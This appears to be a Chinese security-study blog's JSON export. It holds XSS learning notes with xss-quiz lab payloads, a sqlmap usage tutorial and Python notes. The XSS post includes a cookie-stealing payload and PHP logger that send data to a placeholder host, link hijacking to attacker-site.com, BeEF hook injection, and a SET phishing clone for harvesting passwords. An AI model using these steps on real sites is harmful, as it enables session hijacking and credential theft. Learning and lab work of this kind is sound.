{"meta":{"title":"0冻的盒子","subtitle":null,"description":null,"author":"0冻","url":"http://yoursite.com","root":"/"},"pages":[{"title":"archives","date":"2019-08-11T11:30:29.000Z","updated":"2019-08-11T11:30:30.012Z","comments":true,"path":"archives/index.html","permalink":"http://yoursite.com/archives/index.html","excerpt":"","text":""},{"title":"about","date":"2019-08-11T11:32:34.000Z","updated":"2019-08-11T11:34:54.329Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"friends","date":"2019-08-11T11:32:27.000Z","updated":"2019-08-11T11:32:27.503Z","comments":true,"path":"friends/index.html","permalink":"http://yoursite.com/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-08-11T11:29:54.000Z","updated":"2019-08-11T11:29:54.582Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-08-11T11:29:31.000Z","updated":"2019-08-11T11:29:31.160Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"projects","date":"2019-08-11T11:32:12.000Z","updated":"2019-08-11T11:32:12.360Z","comments":true,"path":"projects/index.html","permalink":"http://yoursite.com/projects/index.html","excerpt":"","text":""}],"posts":[{"title":"无线安全之WiFi技术","slug":"无线安全之WiFi技术","date":"2019-08-08T05:07:31.000Z","updated":"2019-08-08T05:08:32.522Z","comments":true,"path":"2019/08/08/无线安全之WiFi技术/","link":"","permalink":"http://yoursite.com/2019/08/08/无线安全之WiFi技术/","excerpt":"","text":"","categories":[],"tags":[{"name":"无线安全","slug":"无线安全","permalink":"http://yoursite.com/tags/无线安全/"}]},{"title":"xss学习笔记","slug":"xss学习笔记","date":"2019-08-04T01:19:47.000Z","updated":"2019-08-11T06:30:26.116Z","comments":true,"path":"2019/08/04/xss学习笔记/","link":"","permalink":"http://yoursite.com/2019/08/04/xss学习笔记/","excerpt":"xss学习记录","text":"xss学习记录 介绍跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。 分类反射型XSS又称非持久性XSS，具有一次性。攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。 存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。 DOM型XSSDOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。 盗取cookiecookie介绍某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密） 在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息 目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。 服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。 典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。 反射xss盗取cookie1url?uname=&lt;script&gt;document.location='http://ip/xss_test/cookie.php?cookie='+document.cookie&lt;/script&gt; 将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。 cookie.php代码： 1234&lt;?php$cookie=$_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; cookie 接受cookie参数，写入到cookie.txt 利用cookie会话劫持burp登录界面修改cookie，成功登录 劫持会话后的操作 1.修改配置文件 2.上传webshell 篡改网页链接js代码讲解1234567&lt;script&gt;window.onload=function()&#123;var link=document.getElementsByTagName(\"a\");for(j=0;j&lt;link.length;j++)&#123; link[j].href=\"http://attacker-site.com/\";&#125;&#125;&lt;/script&gt; window.onload 当窗口加载时，执行匿名函数。使用for循环遍历所有获得的连接a标签 xss篡改链接在xss位置输入上面代码 篡改链接指向流量url刷流量，上述代码修改url 篡改链接指向恶意urlbeef 进行恶意链接生成，以及利用hook.js执行其他命令。kali中终端输入beef-xss启动beef并生成恶意链接, 开启一个服务器( service apache2 start )，将下面代码写入到代码（/var/www/index.html）当中 1&lt;script src=\"http://ip[:port]/hook.js\"&gt;&lt;/script&gt; 最后修改url至攻击者的服务器页面，点击即触发。 盗取用户信息盗取用户信息原理克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。 12345graph TDA[用户] --&gt; |访问| B[原始站点有存xss漏洞]B --&gt; |跳转| C[克隆站点]A --&gt; |输入账号密码|CC--&gt;|用户输入账号密码|D(成功获取并存储) setoolkit工具克隆网站万能的社工工具Select from the menu: 从菜单中选择: 1) Social-Engineering Attacks 社会工程学攻击 2) Penetration Testing (Fast-Track) 穿透测试(快速通道) 3) Third Party Modules 第三方模块 4) Update the Social-Engineer Toolkit 更新社交工程师工具包 5) Update SET configuration 更新集合配置 6) Help, Credits, and About 帮助，学分，等等 选中1 1) Spear-Phishing Attack Vectors 鱼叉式钓鱼攻击载体 2) Website Attack Vectors 网站攻击载体 3) Infectious Media Generator 感染介质发生器 4) Create a Payload and Listener 创建一个有效负载和侦听器 5) Mass Mailer Attack 大规模邮件攻击 6) Arduino-Based Attack Vector 基于arduino的攻击向量 7) Wireless Access Point Attack Vector 无线接入点攻击向量 8) QRCode Generator Attack Vector QRCode生成器攻击向量 9) Powershell Attack Vectors Powershell攻击向量 10) Third Party Modules 第三方模块 选中2 1) Java Applet Attack Method Java Applet攻击方法 2) Metasploit Browser Exploit Method Metasploit浏览器利用方法 3) Credential Harvester Attack Method 凭证收割机攻击方法 4) Tabnabbing Attack Method 制表攻击法 5) Web Jacking Attack Method 顶网攻击方法 6) Multi-Attack Web Method 多攻击Web方法 7) HTA Attack Method HTA攻击方法 选中3 1) Web Templates 网页模板 2) Site Cloner 现场切割 3) Custom Import 自定义导入 选中2 Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)Enter the url to clone:输入要克隆的站点url 存储xss跳转克隆网站xss payload: 1&lt;script&gt;window.location=\"http://ip/\"&lt;/script&gt; 查看盗取账号和密码在setoolkit终端中查看账号密码 没有过滤的xss实验环境介绍一个日本安全研究员制作的xss练习靶场https://xss-quiz.int21h.jp/在IE浏览器中打开 闭合文本标签利用xss打开审查工具，查看代码 stage #1 http://xss-quiz.int21h.jp/ 简单payload： 1&lt;script&gt;alert(document.domain);&lt;/script&gt; 闭合payload: 1\"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 属性中的xss配置chrome关闭xss-auditor右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上--args --disable-xss-auditor ,最后给快捷方式命名，完成。 之后就不用IE了，改用Chrome。 属性中xss发现Ctrl+f代码审查 stage #2 http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c 属性中xss闭合引入script 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 属性中xss闭合引入事件 1\" onmouseover=alert(document.domain);&gt; 选择列表中的xsshtml select 标签介绍123&lt;select&gt;&lt;option&gt;name&lt;/option&gt;&lt;/select&gt; 表单介绍html表单用于搜集不同类型的用户输入 1&lt;form action=\"?sid=...\" method=\"post\"&gt;&lt;/form&gt; burp测试 stage #3 http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d 抓取，p2储存在漏洞payload: 1p2=japan&lt;script&gt;alert(document.domain);&lt;/script&gt; 选择参数中的xsshtml表单隐藏参数介绍1&lt;input type=\"hidden\" name=\"...\" value=\"...\"&gt; html中svg介绍svg：意为可缩放的矢量图形，使用xml格式定义图像可通过以下标签嵌入html文档：&lt;wmbed&gt;,&lt;object&gt;或者&lt;iframe&gt;，也可以使用&lt;svg&gt;标签嵌入 12&lt;svg/事件=\"\"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a 闭合触发xss stage #4 http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c payload: 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 限制输入长度的xsshtml 表单文本框介绍html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。 属性介绍： value 规定输入字段的初始值 readonly 规定输入字段为只读 disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。 size 规定输入字段的字符 maxlength 规定输入字段允许的最大长度 xss payload长度计算利用python len函数,如下，结果为40字符 12&gt;&gt;&gt; payload = \"&lt;script&gt;alert(document.domain);&lt;/script&gt;\"&gt;&gt;&gt; len(payload) 浏览器审查工具修改源码 stage #5 http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268 paylaod: 先修改maxlength 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; payload 触发xss漏洞随着安全意识的提高，script可能会被过滤 1\"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a 1111\" onmouseover=\"alert(document.domain)\" html事件中的xsshtml事件介绍在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数 xss漏洞发现 stage #6 http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0 审查代码 1&lt;input type=\"text\" name=\"p1\" size=\"50\" value+\"132456\"&gt; 闭合思路分析1\"onmouseover=\"alert(document.domain) 1\"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a payload触发xss漏洞1\" onclick=\"alert(document.domain) 空格分隔属性的xssxss探测 stage #7 http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8 触发xss1123 onmouseover=alert(document.domain) javascript伪协议的xssjavascript伪协议介绍将js 代码添加到客户端，方法是把它放置在伪协议说明符javascript:后的url中。 他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用;讲这些语句分隔开 1javascript:var now = now Data();\"&lt;h1&gt;this item&lt;/h1&gt;\" + now; js 还可以只含有动作，但不返回值得js语句 1javascript:alert(\"hello world\") xss漏洞发现并触发 设置第一无二字符串提交，在响应中寻找。 stage #8 http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917 1javascript:alert(document.domain) 1&lt;a href=\"javascript:alert(document.domain)\"&gt;javascript:alert(document.domain)&lt;/a&gt; utf-7 xss stage #9 http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456 这里的utf-7 现在的浏览器已经移除了这种编码，危害较小 所以这里取巧： 或者 点击跳过这关 绕过过滤domain为空的xss stage #10 http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d domain被过滤，采取双写，编码绕过 双写： 1132456\"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a 这里使用base64编绕过，也可以采用其他 1132456\"&gt;&lt;script&gt;eval(atob(\"YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"));&lt;/script&gt; 绕过替换script和on事件的xss stage #11 https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a 在伪协议中带空格仍然能执行 1132456\"&gt;&lt;a href=\"javasc ript:alert(document.domain);\"&gt;xss&lt;/a&gt; 然而，404,空格换一下在script中间插入&amp;#09;，&amp;#10;，空格等不可见字符，让正则匹配不到。 1123\"&gt;&lt;a href=\"javasc&amp;#10;ript:alert(document.domain);\"&gt;xss&lt;/a&gt; IE特性绕过xss过滤 stage #12 https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b 这里过滤了&lt;,”,ie,有一特性 两个 ` 号 可闭合 “ 1`` onmouseover=alert(document.domain) css 特性绕过xss过滤 stage #13 https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2 同样是在ie中，css特性： ;background:url(&quot;javascript:alert(document.dmain);&quot;) 1background-color:salmon;background:url(\"javascript:alert(document.domain);\") css触发xsscss介绍层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。 css中执行jscss expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部） 注释绕过关键字过滤 stage #14 https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2 /**/ 1xss:expres/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;) 16进制绕过过滤触发xss符号 -&gt; 16 12&gt;&gt;&gt; import binascii&gt;&gt;&gt; print \"\\\\x\"+binascii.b2a_hex(\"&lt;\") 带上\\x,js 可识别 stage #15 https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e 经检测，&lt; &gt; \\ 被过滤，&lt; 16进制为3c &gt;16进制为3e 1\\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Ascii绕过过滤触发xss符号 -&gt; ascii 12&gt;&gt;&gt; import binascii&gt;&gt;&gt; print \"\\\\u00\" + binascii.b2a_hex(\"&lt;\") stage #16 https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e 1\\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e 源源：由协议，主机名，端口名组成（例：协议://主机名:端口号/） 同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面 ie的特殊处理1.位于可信域的互信的域名间，不受同源策略限制 2.ie在判断同源时不考虑端口 document.domain可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。 domain属性可以解决因同源安全策略带来的不同文档的属性共享问题 降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。 cookie的httponly设置消除cookie：Internet选项，常规 cookie httponlysetcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie setcookie(name(必须。规定名称),value(必须，规定值),expire(有效期),path(服务器路径),domain( 域名),secure(是否通过安全的https连接来传输cookie),httponly) 在本地实验： tescookie.php 12345678&lt;?php setcookie(\"user\",\"admin\",NULL,NULL,NULL,NULL,FALSE); setcookie(\"pass\",\"admin\",NULL,NULL,NULL,NULL,TRUE); $id = $_GET[\"id\"]; echo $id;?&gt; 1http://127.0.0.1/testcookie.php?id=%3Cscript%3Edocument.write(document.cookie);%3C/script%3E 就会输出 user=admin，TRUE的pass就不会输出。 xss-filter 过滤器防御函数htmlspecialchars()函数 把预定义的字符转换为html实体 1htmlspecialchars(string,flags,character-set,double_encode) htmlentities()函数 过滤用户输入的数据，将一些特殊字符串转换为html实体。 1htmlentities(string,flags,character-set,double_encode) strip_tags()函数 剥去字符串中得html、xml以及php的标签。 该函数会剥离html注释，这点无法通过allow参数改变。 该函数是二进制安全的。 1strip_tags(string,allow) 自定义xss filter 法一 12345678910111213141516171819202122232425function xss_clean($data)&#123; // Fix &amp;entity＼n; $data=str_replace(array('&amp;','&lt;','&gt;'),array('&amp;amp;','&amp;lt;','&amp;gt;'),$data); $data=preg_replace('/(&amp;#*＼w+)[＼x00-＼x20]+;/u','$1;',$data); $data=preg_replace('/(&amp;#x*[0-9A-F]+);*/iu','$1;',$data); $data=html_entity_decode($data,ENT_COMPAT,'UTF-8'); // Remove any attribute starting with \"on\" or xmlns $data=preg_replace('#(&lt;[^&gt;]+?[＼x00-＼x20\"＼'])(?:on|xmlns)[^&gt;]*+&gt;#iu','$1&gt;',$data); // Remove javascript: and vbscript: protocols $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'\"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data); $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'\"]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2novbscript...',$data); $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'\"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data); // Only works in IE: &lt;span style=\"width: expression(alert('Ping!'));\"&gt;&lt;/span&gt; $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data); $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data); $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;#iu','$1&gt;',$data); // Remove namespaced elements (we do not need them) $data=preg_replace('#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i','',$data); do&#123;// Remove really unwanted tags $old_data=$data; $data=preg_replace('#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i','',$data); &#125;while($old_data!==$data); // we are done... return $data;&#125; 法二 12345678910111213141516171819202122232425262728293031323334&lt;?php//php防注入和XSS攻击通用过滤.//by qq:831937$_GET &amp;&amp; SafeFilter($_GET);$_POST &amp;&amp; SafeFilter($_POST);$_COOKIE &amp;&amp; SafeFilter($_COOKIE);functionSafeFilter (&amp;$arr)&#123; $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/','/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/','/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/','/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/','/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if(is_array($arr)) &#123; foreach($arras$key =&gt; $value) &#123; if(!is_array($value)) &#123; if(!get_magic_quotes_gpc()) //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value = addslashes($value); //给单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）加上反斜线转义 &#125; $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value));//去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125;&#125;?&gt; 编码转义url编码将不安全的字符编码为安全字符在进行传输（通用得安全字母表） %+两个表示字符ascii的16进制数 html编码一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签 实体编码 一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;” 进制编码 以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ . js编码\\u +00 + ASCII码 \\x + ASCII码 jsfuck 编码含义攻击绕过 xss过滤器绕过xss payload测试 kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt 自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。 关注最新的html等内容 例如更新了新标签，可进行xss测试 参考 ：owasp.org xss发生的位置get型url中的xss如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss post表单中的xss在表单中的提交修改的参数值，在页面中显示，很有可能存在xss form data json中的xssjson(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率 json 最常见的格式是对象的键值对 闭合前面+;alert(“xss”);//注释后面 自定义http头中的xss如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss 存储型xss灰盒测试环境搭建PHPstuday:搭建微程序，rocboss 定向xss挖掘:探测漏洞位置，能存储的地方 黑名单审计：查看filter，绕过黑名单 绕过过滤，触发xss：绕过并针对漏洞攻击 自动挖掘工具xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架 原理：不断拼接payload 帮助信息： xsser -h 启动方式： 图像化 xsser- gtk xsstrike stage #17 https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"},{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"python笔记","slug":"python笔记","date":"2019-08-04T01:18:51.000Z","updated":"2019-08-10T00:24:08.042Z","comments":true,"path":"2019/08/04/python笔记/","link":"","permalink":"http://yoursite.com/2019/08/04/python笔记/","excerpt":"python","text":"python 不怕念起 就怕觉迟 理可顿悟 事须渐修人们常觉得准备的阶段是在浪费时间。只有真正机会来临， 而自己没有能力把握的时候， 才知道自己平时没有准备才是浪费了时间。 –罗曼·罗兰列表方法：a.append(45)：列表末尾添加45 a.insert(0,77): 在列表索引0位置添加元素77 a.count(s): s出现的次数 a.remove(244): 从列表中移除244 a.reverse() 反转整个列表 a.extend(b) b的所有元素添加到a末尾 a.sort() 小到大排序（前提可排） del a[1] 删除索引1的元素 a.pop() 弹出末尾元素 a.pop(5)弹出索引5的元素 列表做栈和队列 列表推导式squares = list(map(lambda, x : x**2, range(10) ) ) squares = [x**2 for x in range(10) ] 遍历列表同时并返回元素索引值 for i, j in enumerate([‘a’, ‘b’, ‘c’]) 元组特性不可变 单个元素元组（123，） 集合空集合 set{} a.set(“asdfsdagsa”) b.set(“dfsfsdg”) a -&gt; a去重后的字母 a-b a有而b没有的字母 a | b 存在于a或b的字母 a&amp;b a与b都有的字母 a^b 存在于a或b,但不同时存在的字母 添加字母随机位置随机排列 a.add() a.pop() 字典空字典 {} dict() 在包含键值对的元组中的创建字典 dict( ( ( “name”, “wang” ), ( “password “, “passwd “ ) ) ) item() 遍历一个字典 for x, y in a.item() 向子典中得元素添加数据，需判断元素是否存在，不存在需创建一个默认值 data = {} data.setdefault(‘names’, []).append(‘python’) 索引一个不存在的键，会报错（keyerror） data.get(‘foo’, 0) 不存在就会返回0 字符串“字符串中有 /n 的时候” print输出会有换行。 方法： split() join() strip() (l,r)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"sqlmap详细使用教程","slug":"sqlmap详细使用教程","date":"2019-07-04T15:34:53.000Z","updated":"2019-08-03T23:32:35.392Z","comments":true,"path":"2019/07/04/sqlmap详细使用教程/","link":"","permalink":"http://yoursite.com/2019/07/04/sqlmap详细使用教程/","excerpt":"sqlmap 开源的渗透测工具","text":"sqlmap 开源的渗透测工具 介绍sqlmap 是开源的渗透测试工具，自动化检测sql注入漏洞，利用其漏洞获取数据库服务器的权限。它的检测引擎功能强大，对于不同类型的数据库的渗透测试，拥有不同的功能选项；既可以获取数据库中存储的数据，又可以访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。 安装与环境配置sqlmap官网 下载python2.7，安装完成后，配置环境： path内添加python安装路径，例如 D:\\python 环境配置教学 确定探测目标直连数据库-d 数据库类型：文件型数据库（前提是知道数据库绝对路径），关系型数据库（前提是知道数据库用户名和密码） 连接关系型数据库 操作 sqlmap -d “DBMS://User:Password@DBMS_Ip:DBMS_Port/DB_Name” -f –banner -users -d 表示直连 DBMS有mysql,oracle,microsofe sql server,psql,etc… -f fetch 返回 1sqlmap -d \"mysql://root:123456@192.168.1.123:3306/test\" -f --banner --users 连接文件型数据库 操作 同上，DBMS的种类有SQLite,microsofe Access,Firebird,etc… sqlmap -d “DBMS://db_filepath” 1sqlmap -d \"DBMS://db_filepath\" 指定URL-u sqlmap -u “http://targeturl[:port]/[目标文件文件夹]&quot; -u/–url 连接url 1sqlmap -u \"http://www.target.com/index.php?id=1\" --banner 不同类型文件中读取目标-l 从burpsuit proxy或web Scarab proxy中读取Http请求的日志文件 -x 从sitemap.xml站点地图文件中读取目标探测 -m 从多行文本格式文件中读取多个目标，对多个目标进行探测 -r 从文本文件中读取Http请求作为sql注入探测的目标 -c 从配置文件sqlmap.conf 中读取目标探测 google批量扫注入-g sqlmap通过-g自动利用Google hack的目标，然后利用交互向导模式进行sqlmap注入探测 python sqlmap.py -g “inurl:&quot;.php?id=1&quot;“ Google hacking语法 1sqlmap -g \"inurl:.php?id=\" 请求参数设置设置http请求方法--method=PUT 默认为get 设置post参数--data 默认HTTP请求方法为get,但可以隐式的改为post(方法为提供post要发送的数据) 1sqlmap -u \"http://www.target.php?id=1\" --data=\"uname=adnin\" -f --dbs --banner --users -f （fingerprint）指纹 –data=”uname=admin” post 发送的数据 设置参数分隔符--param-del 指定分隔符 默认为“&amp;”做分隔符 在某些情况下，sqlmap需要覆盖默认参数分隔符（例如&amp; in Get和Post数据），才能正确地分割和单独处理每个参数 1sqlmap -u \"www.target.com/culnds.php\" --data=\"query=foobar;id=1\" --param-del=\";\" --banner –param-del=”;”，特殊情况下(其中提交的数据是以“；”号做为分割符，sqlmap 无法识别正误)，指定参数分割，sqlmap才能判断。 设置cookie参数使用场景 web应用程序有基于cookie验证的过程 利用cookie值上的sql注入漏洞 过程 登录/浏览页面（无法登录是无法获取正确cookie值的） 审计工具/代理工具截断，复制cookie 在使用sqlmap 注：对HTTP cookie值进行sql注入探测，需要设置 –level 2以上 12&gt; sqlmap -r target.txt --level 2 -p uname&gt; --cookie 1sqlmap -u \"http://192.168.127.137/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit\" --cookie \"security=impossible; PHPSESSID=jeadfeijr3rc9sv6fcaib8\" --banner 如果服务器端响应新的cookie值，此时sqlmap 会询问你将要使用哪组cookie --drop-set-cookie 忽略任何即将到来的set-cookie头,仍然使用我们自己设置的cookie值，丢弃服务端响应的cookie值 --load-cookies 可以用来加载一些 Netscape/wget格式的特殊文件的cookie --cookie-del 进行分割的参数 设置user-agent头 默认情况下，sqlmap使用用户代理头，执行HTTP请求：sqlmap/1.0-dev-xxxxxx(http://sqlmap.org) 一些站点在服务端检测HTTP user-agent值，如果不是一个合法的值，就会中断连接，同时sqlmap也会报出错误 --user-agent 用来伪造（自定义）用户代理 --random-agent 会在./txt/user-agent中随机选择一个用于会话中的所有Http请求(usr/share/sqlmap/txt/user-agents.txt) 1sqlmap -u \"...\" --random-agent --banner 1sqlmap -u \"...\" --user-agent=\"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\" --banner 注： 对user-agent值（*）探测sql注入，需要设置–level 3 设置host头可以手动设置HTTP主机头值，默认情况下，从目标url解析http主机头 注： 对HTTP主机头进行host注入检测，设置level 5 如果在http头内的host,标了“*”，则可不设置level 5 设置referer头伪造http referer 值是可能的，默认情况下，如果没有显式设置，http请求中不会发送http引用头 对于http引用头sql注入测试，应甚至level 3 设置额外的http头--header --headers 提供额外的 http 标头，每个标头必须要用换行符分隔，在sqlmap.conf 配置文件中设置更方便 “\\n”作为–headers的分隔符 设置http协议认证--auth-type 支持Basic,Digest,NTLM --auth-cred 认证语法为： username：password 1sqlmapd -u \"http://url/arit.php?id=1\" --auth-type Basic --auth-cred \"testuser:testpass\" 设置代理--proxy 设置http代理服务器位置,格式：http(s)://ip[:port] --proxy-cred 设置http代理服务器认证信息，格式：–proxy-cred username:password --proxy-file 设置多条代理在文本中，可进行替换，快速完成切换 --ignore-proxy 忽略系统设置的代理服务器 设置tor隐藏网络–tor –tor-port –tor-type –check-tor 检查tor是否可用 1apt install tor #如果没有，需要安装 1service tor start 1sqlmap -u \"...\" -tor --tor-type https --check-tor 设置延迟某些服务器，会在你发包过快发出预警，或中断；默认是不设置延迟的。 –delay 0.5 设置延迟0.5秒 设置超时指定等待的秒数，默认是30秒 –timeout 10.5 10秒半 设置重试次数默认重试3次 –retries 4 